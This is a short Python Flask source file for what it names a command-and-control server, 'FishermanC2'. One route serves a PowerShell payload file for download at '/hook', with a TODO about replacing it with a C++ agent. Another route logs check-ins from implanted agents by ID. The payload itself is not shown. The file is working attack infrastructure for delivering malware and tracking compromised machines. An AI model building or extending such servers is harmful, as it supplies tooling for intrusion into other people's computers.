from flask import Flask, send_file, request

app = Flask(__name__)


@app.route('/')
def index():
    return 'FishermanC2'


@app.route('/hook')  # TODO: change payload to the cpp agent
def hook():
    return send_file("D:/Reel/test_payload.ps1", as_attachment=True)


@app.route('/<agentId>/status', methods=['GET'])
def keeper(agentId):
    status = request.args.get('status')
    if status == 'ok':
        app.logger.info('%s is ok', agentId)
    else:
        app.logger.error('%s is having issues', agentId)

    return 'ok'
